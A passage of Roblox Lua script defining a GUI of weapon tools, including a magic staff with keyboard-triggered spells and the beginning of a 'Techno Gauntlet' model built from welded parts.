			up = "right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05))wait()right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05))wait()right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1))wait()right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15))wait()right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2))wait()right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25))" 
			down = "right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2))wait()right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15))wait()right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1))wait()right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05))wait()right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05))" 
			-- end of staff 
			mouse.KeyDown:connect(function(key) 
				-- moves 
				if key == "z" then 
					if rbw.Part0 == rarm then 
						rbw.Part0 = larm 
					end 
				end 
				if key == "x" then 
					if rbw.Part0 == larm then 
						rbw.Part0 = rarm 
					end 
				end 
				if key == "e" then 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					wait() 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					wait() 
					right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
					wait(.5) 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05)) 
				elseif key == "q" then 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.05)) 
					wait() 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					left.C1 = CFrame.new(1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
					wait(.5) 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.05)) 
				elseif key == "r" then 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.05)) 
					wait() 
					left.C1 = CFrame.new(1.42,0.62,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.3)) 
					wait() 
					left.C1 = CFrame.new(1.29,0.84,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.35)) 
					wait() 
					left.C1 = CFrame.new(1.16,1.06,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.4)) 
					wait() 
					left.C1 = CFrame.new(1.03,1.28,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.45)) 
					wait() 
					left.C1 = CFrame.new(0.9,1.5,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.5)) 
					wait(.2) 
					left.C1 = CFrame.new(0.9,1.5,-0.15)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*.5)) 
					wait() 
					left.C1 = CFrame.new(0.9,1.5,-0.30)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*.5)) 
					wait() 
					left.C1 = CFrame.new(0.9,1.5,-0.45)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*.5)) 
					wait() 
					left.C1 = CFrame.new(0.9,1.5,-0.60)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*.5)) 
					wait() 
					left.C1 = CFrame.new(0.9,1.5,-0.75)*CFrame.Angles((math.pi*-.75),(math.pi*0),(math.pi*.5)) 
					wait(.1) 
					left.C1 = CFrame.new(1.03,1.28,0)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*.45)) 
					wait() 
					left.C1 = CFrame.new(1.16,1.06,0)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*.4)) 
					wait() 
					left.C1 = CFrame.new(1.29,0.84,0)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*.35)) 
					wait() 
					left.C1 = CFrame.new(1.42,0.62,0)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*.3)) 
					wait() 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.05)) 
				elseif key == "t" then 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05)) 
					wait() 
					right.C1 = CFrame.new(-1.42,0.62,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.3)) 
					wait() 
					right.C1 = CFrame.new(-1.29,0.84,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.35)) 
					wait() 
					right.C1 = CFrame.new(-1.16,1.06,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.4)) 
					wait() 
					right.C1 = CFrame.new(-1.03,1.28,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.45)) 
					wait() 
					right.C1 = CFrame.new(-0.9,1.5,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.5)) 
					wait(.2) 
					right.C1 = CFrame.new(-0.9,1.5,-0.15)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*-.5)) 
					wait() 
					right.C1 = CFrame.new(-0.9,1.5,-0.30)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*-.5)) 
					wait() 
					right.C1 = CFrame.new(-0.9,1.5,-0.45)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*-.5)) 
					wait() 
					right.C1 = CFrame.new(-0.9,1.5,-0.60)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*-.5)) 
					wait() 
					right.C1 = CFrame.new(-0.9,1.5,-0.75)*CFrame.Angles((math.pi*-.75),(math.pi*0),(math.pi*-.5)) 
					wait(.1) 
					right.C1 = CFrame.new(-1.03,1.28,0)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*-.45)) 
					wait() 
					right.C1 = CFrame.new(-1.16,1.06,0)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*-.4)) 
					wait() 
					right.C1 = CFrame.new(-1.29,0.84,0)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*-.35)) 
					wait() 
					right.C1 = CFrame.new(-1.42,0.62,0)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*-.3)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05)) 
				end 
				-- spells------------------------------------------------------------------------------------- 
				if key == "f" then 
					loadstring(up)() 
					local wall = Instance.new("Part") 
					wall.Parent = Workspace 
					wall.Size = Vector3.new(10,1,10) 
					wall.formFactor = "Symmetric" 
					wall.CFrame = player.Torso.CFrame *CFrame.new(0,-3.42,0) 
					wall.TopSurface = 0 
					wall.BottomSurface = 0 
					wall.Anchored = true 
					wall.BrickColor = BrickColor.new(1006) 
					wall.Material = "Ice" 
					game:GetService("Debris"):AddItem(wall, 15) 
					while wall:IsDescendantOf(Workspace) do 
						wait() 
						wall.CFrame = player.Torso.CFrame*CFrame.new(0,-3.42,0) 
					end 
					wait(.5) 
					loadstring(down)() 
				end 
				if key == "g" then 
					if mouse.Target then 
						if mouse.Target.Parent:findFirstChild("Humanoid") ~= nil then 
							local tar = mouse.Target 
							loadstring(up)() 
							local spark = Instance.new("Explosion") 
							spark.BlastRadius = 4 
							spark.BlastPressure = 0 
							spark.Parent = Workspace 
							spark.Position = tip2.Position 
							local ptar = tar.Parent 
							local mis = Instance.new("Part") 
							mis.formFactor = "Symmetric" 
							mis.Shape = "Ball" 
							mis.BrickColor = BrickColor.new(1006) 
							mis.Transparency = .5 
							mis.Size = Vector3.new(1,1,1) 
							mis.Parent = Workspace 
							mis.CFrame = staff.CFrame * CFrame.new(0,0,-15) 
							local misv = Instance.new("BodyVelocity") 
							misv.Parent = mis 
							misv.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
							misv.velocity = mis.CFrame.lookVector * 50 
							local misg = Instance.new("BodyGyro") 
							misg.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
							misg.Parent = mis 
							misg.cframe = CFrame.new(tar.Position, mis.Position) 
							mis.Touched:connect(function(hit) 
								if hit.Name == tar.Name then 
									local ex = Instance.new("Explosion") 
									ex.Parent = Workspace 
									ex.Position = mis.Position 
									mis:remove() 
								end 
							end) 
							wait(.5) 
							loadstring(down)() 
							while mis.Parent == Workspace and tar:IsDescendantOf(Workspace) do 
								wait() 
								misg.cframe = CFrame.new(tar.Position, mis.Position) 
								local fire = Instance.new("Explosion") 
								fire.Parent = Workspace 
								fire.Position = mis.Position 
								fire.BlastRadius = 2 
								misv.velocity = mis.CFrame.lookVector * -18 
							end 
							mis:remove() 
						end 
					end 
				end 
				if key == "b" then 
					loadstring(up)() 
					for i = 1,100 do 
						wait() 
						local p = Instance.new("Part") 
						p.BrickColor = BrickColor.new(1006) 
						p.Name ="check" 
						p.Parent = Workspace 
						p.CanCollide = false 
						p.Size = Vector3.new(1,3,1) 
						p.CFrame = player.Torso.CFrame + Vector3.new(math.random(-5,5),math.random(-2,4),math.random(-5,5)) 
						p.formFactor = "Symmetric" 
						p.TopSurface = 0 
						p.BottomSurface = 0 
						p.Transparency = .5 
						local pm = Instance.new("SpecialMesh") 
						pm.Parent = p 
						pm.MeshType = "Sphere" 
						pm.Scale = Vector3.new((.2+(.05*i)),(.2+(.05*i)),(.2+(.05*i))) 
						local pbv = Instance.new("BodyVelocity") 
						pbv.Parent = p 
						pbv.velocity = Vector3.new(0,10,0) 
						game:GetService("Debris"):AddItem(p, .2) 
						player.Humanoid.Health = player.Humanoid.Health +2 
					end 
					player.Torso.CFrame = mouse.Hit + Vector3.new(0,4,0) 
					wait(.5) 
					loadstring(down)() 
				end 
				if key == "v" then 
					local tar = mouse.Target 
					if tar ~= nil then 
						if (tip6a.Position - tar.Position).magnitude < 100 then 
							loadstring(up)() 
							local shot = Instance.new("Part") 
							shot.Parent = Workspace 
							shot.BrickColor = BrickColor.new("Cyan") 
							shot.formFactor = "Symmetric" 
							shot.Size = Vector3.new(1,1,1) 
							shot.Anchored = true 
							local shotm = Instance.new("BlockMesh") 
							shotm.Scale = Vector3.new(.2,.2,(tip6a.Position - mouse.Hit.p).magnitude) 
							shot.CFrame = CFrame.new(((tip6a.Position + mouse.Hit.p)/2),mouse.Hit.p) 
							shotm.Parent = shot 
							if tar.Parent:findFirstChild("Humanoid") ~= nil then 
								local ice = Instance.new("Part") 
								ice.Position = tar.Parent.Torso.Position 
								ice.Anchored = true 
								tar.Parent.Torso.Anchored = true 
								ice.BrickColor = BrickColor.new("Cyan") 
								ice.Size = Vector3.new(4,6,4) 
								ice.Reflectance = .2 
								ice.TopSurface = 0 
								ice.BottomSurface = 0 
								ice.Transparency = .5 
								ice.Parent = tar.Parent 
								coroutine.resume(coroutine.create(function() kill(tar) end)) 
							end 
							wait(.1) 
							shot:remove() 
						end 
						wait(.5) 
						loadstring(down)() 
					end 
				end 
				if key == "c" then 
					local tar = mouse.Target 
					if tar ~= nil then 
						if (tip6a.Position - tar.Position).magnitude < 100 then 
							loadstring(up)() 
							right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
							local shot = Instance.new("Part") 
							shot.Parent = Workspace 
							shot.BrickColor = BrickColor.new("Royal purple") 
							shot.formFactor = "Symmetric" 
							shot.Size = Vector3.new(1,1,1) 
							shot.Anchored = true 
							local shotm = Instance.new("BlockMesh") 
							shotm.Scale = Vector3.new(.2,.2,(tip6a.Position - mouse.Hit.p).magnitude) 
							shot.CFrame = CFrame.new(((tip6a.Position + mouse.Hit.p)/2),mouse.Hit.p) 
							shotm.Parent = shot 
							if tar.className == "Part" then 
								local ice = Instance.new("Part") 
								ice.CFrame = tar.CFrame 
								ice.Size = tar.Size + Vector3.new(1,1,1) 
								ice.Anchored = true 
								tar.Anchored = true 
								ice.BrickColor = BrickColor.new("Cyan") 
								ice.Reflectance = .2 
								ice.TopSurface = 0 
								ice.BottomSurface = 0 
								ice.Transparency = .5 
								ice.Parent = tar 
								ice.Friction = 0 
								game:GetService("Debris"):AddItem(ice, 10) 
								wait(.1) 
								shot:remove() 
								wait(.5) 
								loadstring(down)() 
							end 
						end 
					end 
				end 
				if key == "h" then 
					loadstring(up)() 
					local cf = CFrame.new(tip2.Position, mouse.Hit.p) 
					local v = cf.lookVector 
					local dx = (math.random() - .5) * .02 
					local dy = (math.random() - .5) * .02 
					local dz = (math.random() - .5) * .02 
					parts = {} 
					local f = coroutine.create(function() fire(Vector3.new(v.x + dx, v.y + dy, v.z + dz)) end) 
					coroutine.resume(f) 
					wait(.5) 
					loadstring(down)() 
				end 
				if key == "y" then 
					loadstring(up)() 
					for i = 2,101 do 
						wait() 
						local boulder = Instance.new("Part") 
						boulder.TopSurface = 0 
						boulder.BottomSurface = 0 
						boulder.Anchored = true 
						boulder.BrickColor = BrickColor.new("Dark stone grey") 
						boulder.Size = Vector3.new((i+math.random(-1,1)),(i+math.random(-1,1)),2) 
						boulder.CFrame = tip.CFrame * CFrame.new(0,0,-2*i) 
						boulder.Velocity = boulder.CFrame.lookVector * 500 
						boulder.Material = "Slate" 
						boulder.Parent = Workspace 
						boulder.Touched:connect(function(hit) 
							if hit.Parent:findFirstChild("Humanoid") ~= nil then 
								hit.Parent.humanoid.Sit = true 
							end 
						end) 
						game:GetService("Debris"):AddItem(boulder, .8) 
					end 
					loadstring(down)() 
				end 
				if key == "n" then 
					local tar = mouse.Target 
					if tar~= nil then 
						if tar.Parent:findFirstChild("Humanoid") ~= nil then 
							if tar.Parent:findFirstChild("Torso") ~= nil then 
								loadstring(up)() 
								for i = 1,100 do 
									wait() 
									local p = Instance.new("Part") 
									p.BrickColor = BrickColor.new(1006) 
									p.Name ="check" 
									p.Parent = Workspace 
									p.CanCollide = false 
									p.Size = Vector3.new(1,3,1) 
									p.CFrame = tar.Parent.Torso.CFrame + Vector3.new(math.random(-5,5),math.random(-2,4),math.random(-5,5)) 
									p.formFactor = "Symmetric" 
									p.TopSurface = 0 
									p.BottomSurface = 0 
									p.Transparency = .5 
									local pm = Instance.new("SpecialMesh") 
									pm.Parent = p 
									pm.MeshType = "Sphere" 
									pm.Scale = Vector3.new((.2+(.05*i)),(.2+(.05*i)),(.2+(.05*i))) 
									local pbv = Instance.new("BodyVelocity") 
									pbv.Parent = p 
									pbv.velocity = Vector3.new(0,10,0) 
									game:GetService("Debris"):AddItem(p, .2) 
									tar.Parent.Humanoid.Health = tar.Parent.Humanoid.Health +2 
								end 
								tar.Parent.Torso.CFrame = mouse.Hit + Vector3.new(0,4,0) 
								wait(.5) 
								loadstring(down)() 
							end 
						end 
					end 
				end 
				if key == "u" then 
					loadstring(up)() 
					local start = Instance.new("Part") 
					start.Parent = Workspace 
					start.Position = mouse.Hit.p + Vector3.new(0,18,0) 
					start.Anchored = true 
					start.Size = Vector3.new(1,1,1) 
					start.Transparency = 1 
					for i = 1,36 do 
						start.CFrame = start.CFrame * CFrame.Angles(math.rad(0),math.rad(5),math.rad(0)) 
						local wall1 = Instance.new("Part") 
						wall1.Parent = Workspace 
						wall1.BrickColor = BrickColor.new("Really black") 
						wall1.Size = Vector3.new(1,10,1) 
						wall1.Anchored = true 
						wall1.TopSurface = 0 
						wall1.CFrame = start.CFrame * CFrame.new(10,-15,0) 
						local wall2 = Instance.new("Part") 
						wall2.Parent = Workspace 
						wall2.BrickColor = BrickColor.new("Really black") 
						wall2.Size = Vector3.new(1,10,1) 
						wall2.Anchored = true 
						wall2.TopSurface = 0 
						wall2.CFrame = start.CFrame * CFrame.new(10,-15,0) 
						local wall1a = Instance.new("Part") 
						wall1a.Parent = Workspace 
						wall1a.BrickColor = BrickColor.new("Really black") 
						wall1a.Size = Vector3.new(1,10,1) 
						wall1a.Anchored = true 
						wall1a.TopSurface = 0 
						wall1a.CFrame = start.CFrame * CFrame.new(-10,-15,0) 
						local wall2a = Instance.new("Part") 
						wall2a.Parent = Workspace 
						wall2a.BrickColor = BrickColor.new("Really black") 
						wall2a.Size = Vector3.new(1,0,1) 
						wall2a.Anchored = true 
						wall2a.TopSurface = 0 
						wall2a.CFrame = start.CFrame * CFrame.new(-10,-15,0) 
						local roof = Instance.new("Part") 
						roof.Parent = Workspace 
						roof.Size = Vector3.new(0,1,1) 
						roof.BrickColor = BrickColor.new("Really black") 
						roof.Anchored = true 
						roof.CFrame = start.CFrame * CFrame.new(0,-10,0) 
						roof.TopSurface = 0 
						local roof2 = Instance.new("Part") 
						roof2.Parent = Workspace 
						roof2.Size = Vector3.new(1,1,20) 
						roof2.BrickColor = BrickColor.new("Really black") 
						roof2.Anchored = true 
						roof2.CFrame = start.CFrame * CFrame.new(0,-10,0) 
						roof2.TopSurface = 0 
						local roofa = Instance.new("Part") 
						roofa.Parent = Workspace 
						roofa.Size = Vector3.new(20,1,1) 
						roofa.BrickColor = BrickColor.new("Really black") 
						roofa.Anchored = true 
						roofa.CFrame = start.CFrame * CFrame.new(0,-20,0) 
						roofa.TopSurface = 0 
						local roof2a = Instance.new("Part") 
						roof2a.Parent = Workspace 
						roof2a.Size = Vector3.new(1,1,20) 
						roof2a.BrickColor = BrickColor.new("Really black") 
						roof2a.Anchored = true 
						roof2a.CFrame = start.CFrame * CFrame.new(0,-20,0) 
						roof2a.TopSurface = 0 
						game:GetService("Debris"):AddItem(roof, 15) 
						game:GetService("Debris"):AddItem(wall1, 15) 
						game:GetService("Debris"):AddItem(wall2, 15) 
						game:GetService("Debris"):AddItem(roof2, 15) 
						game:GetService("Debris"):AddItem(wall1a, 15) 
						game:GetService("Debris"):AddItem(wall2a, 15) 
						game:GetService("Debris"):AddItem(roofa, 15) 
						game:GetService("Debris"):AddItem(roof2a, 15) 
						wait() 
					end 
					start:remove() 
					wait(.5) 
					loadstring(down)() 
				end 
				if key == "m" then 
					local tar = mouse.Target 
					if tar.Parent:findFirstChild("Humanoid") ~= nil then 
						if tar.Parent.Name == "Minion" then 
							loadstring(up)() 
							while tar.Parent.Humanoid.Health >= 1 do 
								wait() 
								if player.Humanoid.Health == 0 then 
									tar.Parent.Humanoid:TakeDamage(1000) 
								else 
									tar.Parent.Torso.move.position = mouse.Hit.p 
								end 
							end 
							loadstring(down)() 
						end 
					end 
				end 
				if key == "j" then 
					local tar = mouse.Target 
					if tar.Parent:findFirstChild("Humanoid") ~= nil then 
						tar.Parent.Humanoid.Jump = true 
					end 
				elseif key == "k" then 
					local tar = mouse.Target 
					if tar.Parent:findFirstChild("Humanoid") ~= nil then 
						tar.Parent.Humanoid.Sit = true 
					end 
				elseif key == "l" then 
					local tar = mouse.Target 
					if tar.Parent:findFirstChild("Humanoid") ~= nil then 
						tar.Parent.Humanoid.PlatformStand = true 
					end 
				elseif key == "p" then 
					local min = Instance.new("Model") 
					min.Name = "Minion" 
					min.Parent = Workspace 
					local skel = Instance.new("Humanoid") 
					skel.Parent = min 
					skel.WalkSpeed = 16 
					skel.MaxHealth = 100 
					skel.Health = 100 
					local thing = Instance.new("Part") 
					thing.Name = "Head" 
					thing.formFactor = "Symmetric" 
					thing.TopSurface = 0 
					thing.BottomSurface = 0 
					thing.BrickColor = BrickColor.new(1003) 
					thing.Transparency = .3 
					thing.Size = Vector3.new(4,4,4) 
					thing.Parent = min 
					thing.Position = player.Torso.Position + Vector3.new(0,5,0) 
					thing.Shape = "Ball" 
					local thing2 = Instance.new("Part") 
					thing2.Name = "Torso" 
					thing2.formFactor = "Symmetric" 
					thing2.TopSurface = 0 
					thing2.BottomSurface = 0 
					thing2.BrickColor = BrickColor.new(1004) 
					thing2.Size = Vector3.new(1,1,1) 
					thing2.Parent = min 
					thing2.Position = player.Torso.Position + Vector3.new(0,5,0) 
					thing2.Shape = "Ball" 
					local live = Instance.new("Weld") 
					live.Parent = thing2 
					live.Part0 = thing2 
					live.Part1 = thing 
					live.Name = "Neck" 
					local move = Instance.new("BodyPosition") 
					move.Parent = thing2 
					move.position = player.Torso.Position 
					move.maxForce = Vector3.new(100,0,100) 
					move.Name = "move" 
					thing.Touched:connect(function(hit) 
						if hit.Parent:findFirstChild("Humanoid") ~= nil then 
							if hit.Parent.Name ~= player.Name then 
								if hit.Parent.Name ~= "Minion" then 
									if hit.Parent.Humanoid.MaxHealth > 100 then 
										hit.Parent.Humanoid.MaxHealth = 100 
									end 
									hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - math.random(5,7) 
									hit.Parent.Humanoid.Sit = true 
									for i = 1, (math.random(1,3)) do 
										wait() 
										local bleed = Instance.new("Part") 
										bleed.formFactor = "Symmetric" 
										bleed.Size = Vector3.new(1,1,1) 
										bleed.BrickColor = BrickColor.new("Bright red") 
										bleed.TopSurface = 0 
										bleed.BottomSurface = 0 
										bleed.Reflectance = .1 
										bleed.Transparency = .4 
										bleed.Parent = Workspace 
										bleed.Position = thing.Position 
										local bleedm = Instance.new("SpecialMesh") 
										bleedm.MeshType = "Sphere" 
										bleedm.Scale = Vector3.new(.2,.2,.2) 
										bleedm.Parent = bleed 
										game:GetService("Debris"):AddItem(bleed, 5) 
									end 
								end 
							end 
						end 
					end) 
					coroutine.resume(coroutine.create(function() clean(min,thing2) end)) 
				end 
				--end of keys 
			end) 
			--end of script 
		end) 

		bin.Deselected:connect(function() 
			staff:remove() 
			rs.Part1 = rarm 
			ls.Part1 = larm 
			right:remove() 
			left:remove() 
		end)
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Techno Gauntlet"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.48,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Techno Gauntlet"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	Player = game:GetService("Players").LocalPlayer 
	Character = Player.Character 
	PlayerGui = Player.PlayerGui 
	Backpack = Player.Backpack 
	Torso = Character.Torso 
	Head = Character.Head 
	Humanoid = Character.Humanoid
	LeftArm = Character["Left Arm"] 
	LeftLeg = Character["Left Leg"] 
	RightArm = Character["Right Arm"] 
	RightLeg = Character["Right Leg"] 
	LS = Torso["Left Shoulder"] 
	LH = Torso["Left Hip"] 
	RS = Torso["Right Shoulder"] 
	RH = Torso["Right Hip"] 
	Neck = Torso.Neck
	it=Instance.new
	vt=Vector3.new
	cf=CFrame.new
	euler=CFrame.fromEulerAnglesXYZ
	angles=CFrame.Angles
	necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
	necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
	attack = false 
	attacktype = 1 
	attackdebounce = false 
	MMouse=nil
	combo=0
	Mode="Choose"
	Aiming=false
	DroneTarget=Torso.Position
	Drone1=nil
	Drone2=nil
	Drone3=nil
	Bullets=10
	BowAim=false
	SnipAim=false
	--player 
	player = nil 
	--save shoulders 
	RSH, LSH = nil, nil 
	--welds 
	RW, LW = Instance.new("Weld"), Instance.new("Weld") 
	RW.Name="Right Shoulder" LW.Name="Left Shoulder"


	if Character:findFirstChild("Techno Gauntlet",true) ~= nil then 
		Character:findFirstChild("Techno Gauntlet",true).Parent = nil 
	end 


	function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
		local fp = it("Part")
		fp.formFactor = formfactor 
		fp.Parent = parent
		fp.Reflectance = reflectance
		fp.Transparency = transparency
		fp.CanCollide = false 
		fp.Locked=true
		fp.BrickColor = brickcolor
		fp.Name = name
		fp.Size = size
		fp.Position = Torso.Position 
		fp.BottomSurface="Smooth"
		fp.TopSurface="Smooth"
		fp:BreakJoints()
		return fp 
	end 

	function mesh(Mesh,part,meshtype,meshid,offset,scale)
		local mesh = it(Mesh) 
		mesh.Parent = part
		if Mesh=="SpecialMesh" then
			mesh.MeshType = meshtype
			mesh.MeshId = meshid
		end
		mesh.Offset=offset
		mesh.Scale=scale
		return mesh
	end

	function weld(parent,part0,part1,c0)
		local weld = it("Weld") 
		weld.Parent = parent
		weld.Part0 = part0 
		weld.Part1 = part1 
		weld.C0 = c0
		return weld
	end

	local cone=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Cone",vt(1,1,1))
	local conemsh=mesh("SpecialMesh",cone,"FileMesh","http://www.roblox.com/asset/?id=1778999",vt(0,0,0),vt(0.5,0.5,0.5))
	local screen1=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen1",vt(1,1,1))
	local screen1msh=mesh("BlockMesh",screen1,"","",vt(0,0,0),vt(0.1,0.8,0.9))
	local screen2=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen2",vt(1,1,1))
	local screen2msh=mesh("BlockMesh",screen2,"","",vt(0,0,0),vt(0.1,0.8,0.9))
	local screen3=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen3",vt(1,1,1))
	local screen3msh=mesh("BlockMesh",screen3,"","",vt(0,0,0),vt(0.1,0.8,0.9))
	light1=Instance.new("PointLight")
	light1.Brightness=.8
	light1.Color=Color3.new(.2,.2,255)
	light1.Range=10
	light1.Parent=screen1
	light2=light1:Clone()
	light2.Parent=screen2
	light3=light1:Clone()
	light3.Parent=screen3

	if Character:findFirstChild("Drone",true) ~= nil then 
		Character:findFirstChild("Drone",true).Parent = nil 
	end 

	local modelzorz = Instance.new("Model") 
	modelzorz.Parent = Character 
	modelzorz.Name = "Techno Gauntlet" 

	local prt1=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part1",vt(1,1,1))
	local prt2=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
	local prt3=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
	local prt4=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
	local prt5=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
	local prt6=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
	local prt7=part(3,modelzorz,0,0,Torso.BrickColor,"Part7",vt(1,1,1))
	local prt8=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
	local prt9=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
